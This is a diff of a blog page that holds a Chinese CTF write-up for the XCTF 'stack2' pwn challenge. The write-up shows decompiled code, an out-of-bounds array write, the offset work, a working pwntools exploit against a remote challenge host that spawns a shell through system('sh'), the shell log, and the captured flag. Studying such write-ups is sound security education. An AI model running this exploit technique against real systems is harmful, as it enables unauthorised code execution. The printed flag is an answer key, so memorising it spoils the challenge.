@@ -5,9 +5,10 @@
 <head>
     <meta charset="utf-8">
     <meta name="keywords" content="xctf-challenge-stack2, Matrix">
-    <meta name="description" content="1：checksec[*] &amp;#39;/home/hunter/PWN/XCTF/xctf_challenge/stack2&amp;#39;
+    <meta name="description" content="1：checksec[*] &#39;/home/hunter/PWN/XCTF/xctf_challenge/stack2&#39;
     Arch:     i386-32-little
-    RELRO:    Partial R">
+    RELRO:    Partial RELRO
+   ">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -30,7 +31,7 @@
     </style>
 
     <script src="/libs/jquery/jquery-2.2.0.min.js"></script>
-<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
+<link rel="stylesheet" href="/css/prism-xonokai.css" type="text/css"></head>
 
 
 <body>
@@ -400,14 +401,14 @@
                     
                     <div class="info-break-policy">
                         <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
-                        1.4k
+                        1.3k
                     </div>
                     
 
                     
                     <div class="info-break-policy">
                         <i class="fa fa-clock-o fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                        6 分
+                        5 分
                     </div>
                     
                 
@@ -423,148 +424,152 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h2 id="1：checksec"><a href="#1：checksec" class="headerlink" title="1：checksec"></a>1：checksec</h2><pre><code>[*] &#39;/home/hunter/PWN/XCTF/xctf_challenge/stack2&#39;
+                <h2 id="1：checksec"><a href="#1：checksec" class="headerlink" title="1：checksec"></a>1：checksec</h2><pre class=" language-bash"><code class="language-bash"><span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token string">'/home/hunter/PWN/XCTF/xctf_challenge/stack2'</span>
     Arch:     i386-32-little
     RELRO:    Partial RELRO
     Stack:    Canary found
     NX:       NX enabled
-    PIE:      No PIE (0x8048000)</code></pre><p>开启NX与Canary</p>
-<h2 id="2：IDA"><a href="#2：IDA" class="headerlink" title="2：IDA"></a>2：IDA</h2><pre><code>int __cdecl main(int argc, const char **argv, const char **envp)
-{
-  int v3; // eax
-  unsigned int v5; // [esp+18h] [ebp-90h]
-  unsigned int v6; // [esp+1Ch] [ebp-8Ch]
-  int v7; // [esp+20h] [ebp-88h]
-  unsigned int j; // [esp+24h] [ebp-84h]
-  int v9; // [esp+28h] [ebp-80h]
-  unsigned int i; // [esp+2Ch] [ebp-7Ch]
-  unsigned int k; // [esp+30h] [ebp-78h]
-  unsigned int l; // [esp+34h] [ebp-74h]
-  char v13[100]; // [esp+38h] [ebp-70h]
-  unsigned int v14; // [esp+9Ch] [ebp-Ch]
+    PIE:      No PIE <span class="token punctuation">(</span>0x8048000<span class="token punctuation">)</span></code></pre>
+<p>开启NX与Canary</p>
+<h2 id="2：IDA"><a href="#2：IDA" class="headerlink" title="2：IDA"></a>2：IDA</h2><pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span>
+<span class="token punctuation">{</span>
+  <span class="token keyword">int</span> v3<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// eax</span>
+  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v5<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+18h] [ebp-90h]</span>
+  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v6<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+1Ch] [ebp-8Ch]</span>
+  <span class="token keyword">int</span> v7<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+20h] [ebp-88h]</span>
+  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> j<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+24h] [ebp-84h]</span>
+  <span class="token keyword">int</span> v9<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+28h] [ebp-80h]</span>
+  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+2Ch] [ebp-7Ch]</span>
+  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> k<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+30h] [ebp-78h]</span>
+  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> l<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+34h] [ebp-74h]</span>
+  <span class="token keyword">char</span> v13<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+38h] [ebp-70h]</span>
+  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v14<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+9Ch] [ebp-Ch]</span>
 
-  v14 = __readgsdword(0x14u);
-  setvbuf(stdin, 0, 2, 0);
-  setvbuf(stdout, 0, 2, 0);
-  v9 = 0;
-  puts(&quot;***********************************************************&quot;);
-  puts(&quot;*                      An easy calc                       *&quot;);
-  puts(&quot;*Give me your numbers and I will return to you an average *&quot;);
-  puts(&quot;*(0 &lt;= x &lt; 256)                                           *&quot;);
-  puts(&quot;***********************************************************&quot;);
-  puts(&quot;How many numbers you have:&quot;);
-  __isoc99_scanf(&quot;%d&quot;, &amp;v5);
-  puts(&quot;Give me your numbers&quot;);
-  for ( i = 0; i &lt; v5 &amp;&amp; (signed int)i &lt;= 99; ++i )
-  {
-    __isoc99_scanf(&quot;%d&quot;, &amp;v7);
-    v13[i] = v7;
-  }
-  for ( j = v5; ; printf(&quot;average is %.2lf\n&quot;, (double)((long double)v9 / (double)j)) )
-  {
-    while ( 1 )
-    {
-      while ( 1 )
-      {
-        while ( 1 )
-        {
-          puts(&quot;1. show numbers\n2. add number\n3. change number\n4. get average\n5. exit&quot;);
-          __isoc99_scanf(&quot;%d&quot;, &amp;v6);
-          if ( v6 != 2 )
-            break;
-          puts(&quot;Give me your number&quot;);
-          __isoc99_scanf(&quot;%d&quot;, &amp;v7);
-          if ( j &lt;= 0x63 )
-          {
-            v3 = j++;
-            v13[v3] = v7;
-          }
-        }
-        if ( v6 &gt; 2 )
-          break;
-        if ( v6 != 1 )
-          return 0;
-        puts(&quot;id\t\tnumber&quot;);
-        for ( k = 0; k &lt; j; ++k )
-          printf(&quot;%d\t\t%d\n&quot;, k, v13[k]);
-      }
-      if ( v6 != 3 )
-        break;
-      puts(&quot;which number to change:&quot;);
-      __isoc99_scanf(&quot;%d&quot;, &amp;v5);
-      puts(&quot;new number:&quot;);
-      __isoc99_scanf(&quot;%d&quot;, &amp;v7);
-      v13[v5] = v7;
-    }
-    if ( v6 != 4 )
-      break;
-    v9 = 0;
-    for ( l = 0; l &lt; j; ++l )
-      v9 += v13[l];
-  }
-  return 0;
-}</code></pre><p><strong>关键段：</strong></p>
-<pre><code>      puts(&quot;which number to change:&quot;);
-      __isoc99_scanf(&quot;%d&quot;, &amp;v5);
-      puts(&quot;new number:&quot;);
-      __isoc99_scanf(&quot;%d&quot;, &amp;v7);
-      v13[v5] = v7;</code></pre><h2 id="3：漏洞"><a href="#3：漏洞" class="headerlink" title="3：漏洞"></a>3：漏洞</h2><p><strong>整个代码比较长，但有用的就那么一两个。</strong>关键段代码实现更改数字的功能，v13数组大小是100，<strong>但在这里并没有看到限制了目标位置的输入大小，即：which number to change: 。</strong>而通过伪代码发现v13位于[ebp-70h]所以如果我第一次输入的数字比较大，就可以通过第二次输入来更改高地址栈空间。<br>那么接下来主要就是计算v13到返回地址的长度。</p>
+  v14 <span class="token operator">=</span> <span class="token function">__readgsdword</span><span class="token punctuation">(</span><span class="token number">0x14u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  v9 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
+  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"***********************************************************"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"*                      An easy calc                       *"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"*Give me your numbers and I will return to you an average *"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"*(0 &lt;= x &lt; 256)                                           *"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"***********************************************************"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"How many numbers you have:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v5<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Give me your numbers"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> v5 <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token keyword">signed</span> <span class="token keyword">int</span><span class="token punctuation">)</span>i <span class="token operator">&lt;=</span> <span class="token number">99</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>
+  <span class="token punctuation">{</span>
+    <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v7<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    v13<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> v7<span class="token punctuation">;</span>
+  <span class="token punctuation">}</span>
+  <span class="token keyword">for</span> <span class="token punctuation">(</span> j <span class="token operator">=</span> v5<span class="token punctuation">;</span> <span class="token punctuation">;</span> <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"average is %.2lf\n"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">double</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">long</span> <span class="token keyword">double</span><span class="token punctuation">)</span>v9 <span class="token operator">/</span> <span class="token punctuation">(</span><span class="token keyword">double</span><span class="token punctuation">)</span>j<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>
+  <span class="token punctuation">{</span>
+    <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token number">1</span> <span class="token punctuation">)</span>
+    <span class="token punctuation">{</span>
+      <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token number">1</span> <span class="token punctuation">)</span>
+      <span class="token punctuation">{</span>
+        <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token number">1</span> <span class="token punctuation">)</span>
+        <span class="token punctuation">{</span>
+          <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"1. show numbers\n2. add number\n3. change number\n4. get average\n5. exit"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+          <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v6<span class="token punctuation">)</span><span class="token punctuation">;</span>
+          <span class="token keyword">if</span> <span class="token punctuation">(</span> v6 <span class="token operator">!=</span> <span class="token number">2</span> <span class="token punctuation">)</span>
+            <span class="token keyword">break</span><span class="token punctuation">;</span>
+          <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Give me your number"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+          <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v7<span class="token punctuation">)</span><span class="token punctuation">;</span>
+          <span class="token keyword">if</span> <span class="token punctuation">(</span> j <span class="token operator">&lt;=</span> <span class="token number">0x63</span> <span class="token punctuation">)</span>
+          <span class="token punctuation">{</span>
+            v3 <span class="token operator">=</span> j<span class="token operator">++</span><span class="token punctuation">;</span>
+            v13<span class="token punctuation">[</span>v3<span class="token punctuation">]</span> <span class="token operator">=</span> v7<span class="token punctuation">;</span>
+          <span class="token punctuation">}</span>
+        <span class="token punctuation">}</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span> v6 <span class="token operator">></span> <span class="token number">2</span> <span class="token punctuation">)</span>
+          <span class="token keyword">break</span><span class="token punctuation">;</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span> v6 <span class="token operator">!=</span> <span class="token number">1</span> <span class="token punctuation">)</span>
+          <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
+        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"id\t\tnumber"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">for</span> <span class="token punctuation">(</span> k <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> k <span class="token operator">&lt;</span> j<span class="token punctuation">;</span> <span class="token operator">++</span>k <span class="token punctuation">)</span>
+          <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d\t\t%d\n"</span><span class="token punctuation">,</span> k<span class="token punctuation">,</span> v13<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+      <span class="token punctuation">}</span>
+      <span class="token keyword">if</span> <span class="token punctuation">(</span> v6 <span class="token operator">!=</span> <span class="token number">3</span> <span class="token punctuation">)</span>
+        <span class="token keyword">break</span><span class="token punctuation">;</span>
+      <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"which number to change:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+      <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v5<span class="token punctuation">)</span><span class="token punctuation">;</span>
+      <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"new number:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+      <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v7<span class="token punctuation">)</span><span class="token punctuation">;</span>
+      v13<span class="token punctuation">[</span>v5<span class="token punctuation">]</span> <span class="token operator">=</span> v7<span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span> v6 <span class="token operator">!=</span> <span class="token number">4</span> <span class="token punctuation">)</span>
+      <span class="token keyword">break</span><span class="token punctuation">;</span>
+    v9 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
+    <span class="token keyword">for</span> <span class="token punctuation">(</span> l <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> l <span class="token operator">&lt;</span> j<span class="token punctuation">;</span> <span class="token operator">++</span>l <span class="token punctuation">)</span>
+      v9 <span class="token operator">+</span><span class="token operator">=</span> v13<span class="token punctuation">[</span>l<span class="token punctuation">]</span><span class="token punctuation">;</span>
+  <span class="token punctuation">}</span>
+  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span></code></pre>
+<p><strong>关键段：</strong></p>
+<pre class=" language-c"><code class="language-c">      <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"which number to change:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+      <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v5<span class="token punctuation">)</span><span class="token punctuation">;</span>
+      <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"new number:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+      <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v7<span class="token punctuation">)</span><span class="token punctuation">;</span>
+      v13<span class="token punctuation">[</span>v5<span class="token punctuation">]</span> <span class="token operator">=</span> v7<span class="token punctuation">;</span></code></pre>
+<h2 id="3：漏洞"><a href="#3：漏洞" class="headerlink" title="3：漏洞"></a>3：漏洞</h2><p><strong>整个代码比较长，但有用的就那么一两个。</strong>关键段代码实现更改数字的功能，v13数组大小是100，<strong>但在这里并没有看到限制了目标位置的输入大小，即：which number to change: 。</strong>而通过伪代码发现v13位于[ebp-70h]所以如果我第一次输入的数字比较大，就可以通过第二次输入来更改高地址栈空间。<br>那么接下来主要就是计算v13到返回地址的长度。</p>
 <p>一开始我认为是这样的：<br><img src="https://s1.ax1x.com/2020/07/15/U0ZMKP.png" alt=""><br>那么只要0x70+4 =116个padding就可以了但是怎么都没有成功跳转，我调试发现原来，这个程序的栈没有这么理想：<br><img src="https://s1.ax1x.com/2020/07/15/U0Zlb8.png" alt=""><br>刚开始是这个样子，返回地址__libc_start_main+241已经在栈中了，可以理解为main函数也是被调用的（call）先压入返回地址再跳转执行函数</p>
 <p>执行完main+7：<br><img src="https://s1.ax1x.com/2020/07/15/U0ZQDf.png" alt=""><br>发现上面那个push指令又将这个返回地址压入栈中，那么哪一个才是真的返回地址？那肯定遵循调用函数（call）的说法：<strong>先将返回地址压入栈中，再跳转执行函数，所以一开始压入的才是函数真正的返回地址。</strong><br>我们可以看到马上要执行push  ebp，所以返回地址离ebp有16个字节的距离。这个从栈中可以看出，也可以从一个作恶多端的汇编指令中得出：发现了<strong>0x80485d4 &lt;main+4&gt;:    and    esp,0xfffffff0</strong>  这句话吗？<br>没错是用来平衡堆栈的，与运算。将esp最后一个16进制数归零。我们去看一下当时esp是多少：<br><img src="https://s1.ax1x.com/2020/07/15/U0Z3VS.png" alt=""><br>可以看到是0xffffd02c  那么执行后就是0xffffd0c0 少了12个字节，所以栈中正确的样子是：<br><img src="https://s1.ax1x.com/2020/07/15/U0Zuvt.png" alt=""><br>所以需要的padding是：0x70+8+16 = 132.（可以自己随便输入某个数字来验证是否改变了返回地址）</p>
 <h2 id="4：EXP"><a href="#4：EXP" class="headerlink" title="4：EXP"></a>4：EXP</h2><p><strong>在v13[v5] = v7;这条指令中 v7是int型v13是char型只占用一个字节（在赋值过程会转型），很适合payload来以字节大小填充。也就是说我们执行这条指令是以一个字节一个字节形式进行数据覆盖（16进制的两个数字）。</strong><br>通过IDA看到后门地址0x804859b 可以执行system(“/bin/bash”).因为每利用一次漏洞只能覆盖两个16进制数，所以要多次运行change numbers 选项。</p>
-<pre><code>from pwn import*
-context.log_level = &#39;debug&#39;
-#sh =process(&#39;./stack2&#39;)
-sh = remote(&#39;220.249.52.133&#39;,32607)
-#0804859B 后门
-#0x8048450 system
-#0x08048987 : sh
-#addr = [0x9b,0x85,0x04,0x08]               #原本我可以直接用后门地址，填充四次就可以了.这个本地没问题，但在打开端口后因为环境中只有sh这个指令所以会失败
-addr = [0x50,0x84,0x04,0x08,0x8b,0x85,0x04,0x08,0x87,0x89,0x04,0x08]  #这个是来应对环境中只有sh命令，用gdb找到system函数地址，ROPgadgate找到sh字符串地址
-                                                                        #在栈上构造了一个system(&quot;/sh&quot;)
-sh.sendline(&#39;1&#39;)
-sh.recv()
-sh.sendline(&#39;1&#39;)
-sh.recv()
-flag = 132                     #通过计算从132开始覆盖（记得小端序）由于addr的变动覆盖12次
-for i in range(12):
+<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>
+context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>
+<span class="token comment" spellcheck="true">#sh =process('./stack2')</span>
+sh <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'220.249.52.133'</span><span class="token punctuation">,</span><span class="token number">32607</span><span class="token punctuation">)</span>
+<span class="token comment" spellcheck="true">#0804859B 后门</span>
+<span class="token comment" spellcheck="true">#0x8048450 system</span>
+<span class="token comment" spellcheck="true">#0x08048987 : sh</span>
+<span class="token comment" spellcheck="true">#addr = [0x9b,0x85,0x04,0x08]               #原本我可以直接用后门地址，填充四次就可以了.这个本地没问题，但在打开端口后因为环境中只有sh这个指令所以会失败</span>
+addr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x50</span><span class="token punctuation">,</span><span class="token number">0x84</span><span class="token punctuation">,</span><span class="token number">0x04</span><span class="token punctuation">,</span><span class="token number">0x08</span><span class="token punctuation">,</span><span class="token number">0x8b</span><span class="token punctuation">,</span><span class="token number">0x85</span><span class="token punctuation">,</span><span class="token number">0x04</span><span class="token punctuation">,</span><span class="token number">0x08</span><span class="token punctuation">,</span><span class="token number">0x87</span><span class="token punctuation">,</span><span class="token number">0x89</span><span class="token punctuation">,</span><span class="token number">0x04</span><span class="token punctuation">,</span><span class="token number">0x08</span><span class="token punctuation">]</span>  <span class="token comment" spellcheck="true">#这个是来应对环境中只有sh命令，用gdb找到system函数地址，ROPgadgate找到sh字符串地址</span>
+                                                                        <span class="token comment" spellcheck="true">#在栈上构造了一个system("/sh")</span>
+sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>
+sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
+sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>
+sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
+flag <span class="token operator">=</span> <span class="token number">132</span>                     <span class="token comment" spellcheck="true">#通过计算从132开始覆盖（记得小端序）由于addr的变动覆盖12次</span>
+<span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
 
-    sh.sendline(&#39;3&#39;)
-    sh.recv()
-    sh.sendline(str(flag))  #pwntools发送的都是str类型
-    sh.recv()
-    flag += 1
-    sh.sendline(str(addr[i]))
-    sh.recv()
+    sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'3'</span><span class="token punctuation">)</span>
+    sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#pwntools发送的都是str类型</span>
+    sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    flag <span class="token operator">+=</span> <span class="token number">1</span>
+    sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>addr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+    sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
 
 
-#gdb.attach(sh)
-sh.sendline(&#39;5&#39;)
+<span class="token comment" spellcheck="true">#gdb.attach(sh)</span>
+sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'5'</span><span class="token punctuation">)</span>
 
-sh.interactive()</code></pre><p>这个虽然开了banary但是和他感觉没啥关系</p>
-<pre><code>[*] Switching to interactive mode
-[DEBUG] Received 0x46 bytes:
-    &#39;1. show numbers\n&#39;
-    &#39;2. add number\n&#39;
-    &#39;3. change number\n&#39;
-    &#39;4. get average\n&#39;
-    &#39;5. exit\n&#39;
+sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
+<p>这个虽然开了banary但是和他感觉没啥关系</p>
+<pre class=" language-bash"><code class="language-bash"><span class="token punctuation">[</span>*<span class="token punctuation">]</span> Switching to interactive mode
+<span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Received 0x46 bytes:
+    <span class="token string">'1. show numbers\n'</span>
+    <span class="token string">'2. add number\n'</span>
+    <span class="token string">'3. change number\n'</span>
+    <span class="token string">'4. get average\n'</span>
+    <span class="token string">'5. exit\n'</span>
 1. show numbers
 2. add number
 3. change number
 4. get average
-5. exit
-$ ls
-[DEBUG] Sent 0x3 bytes:
-    &#39;ls\n&#39;
-[DEBUG] Received 0x24 bytes:
-    &#39;bin\n&#39;
-    &#39;dev\n&#39;
-    &#39;flag\n&#39;
-    &#39;lib\n&#39;
-    &#39;lib32\n&#39;
-    &#39;lib64\n&#39;
-    &#39;stack2\n&#39;
+5. <span class="token keyword">exit</span>
+$ <span class="token function">ls</span>
+<span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Sent 0x3 bytes:
+    <span class="token string">'ls\n'</span>
+<span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Received 0x24 bytes:
+    <span class="token string">'bin\n'</span>
+    <span class="token string">'dev\n'</span>
+    <span class="token string">'flag\n'</span>
+    <span class="token string">'lib\n'</span>
+    <span class="token string">'lib32\n'</span>
+    <span class="token string">'lib64\n'</span>
+    <span class="token string">'stack2\n'</span>
 bin
 dev
 flag
@@ -572,13 +577,14 @@ lib
 lib32
 lib64
 stack2
-$ cat flag
-[DEBUG] Sent 0x9 bytes:
-    &#39;cat flag\n&#39;
-[DEBUG] Received 0x2d bytes:
-    &#39;cyberpeace{b39d4c717df76e74117613fc8e3a89d5}\n&#39;
-cyberpeace{b39d4c717df76e74117613fc8e3a89d5}
+$ <span class="token function">cat</span> flag
+<span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Sent 0x9 bytes:
+    <span class="token string">'cat flag\n'</span>
+<span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Received 0x2d bytes:
+    <span class="token string">'cyberpeace{b39d4c717df76e74117613fc8e3a89d5}\n'</span>
+cyberpeace<span class="token punctuation">{</span>b39d4c717df76e74117613fc8e3a89d5<span class="token punctuation">}</span>
 $  </code></pre>
+
             </div>
             <hr/>
 
@@ -754,7 +760,8 @@ $  </code></pre>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary">1：checksechunter@hunter:~/PWN/XCTF/xctf_challenge$ checksec forgot
-[*] &#39;/home/hunter/PWN/XCTF/xctf_challenge/forgot&</div>
+[*] '/home/hunter/PWN/XCTF/xctf_challenge/forgot'
+   </div>
                     <div class="publish-info">
                         <span class="publish-date">
                             <i class="fa fa-clock-o fa-fw icon-date"></i>2020-07-16
@@ -923,7 +930,7 @@ $  </code></pre>
 
             
                 &nbsp;<i class="fa fa-area-chart"></i>&nbsp;站点总字数:&nbsp;
-                <span class="white-color">31.5k</span>
+                <span class="white-color">30k</span>
             
 
             
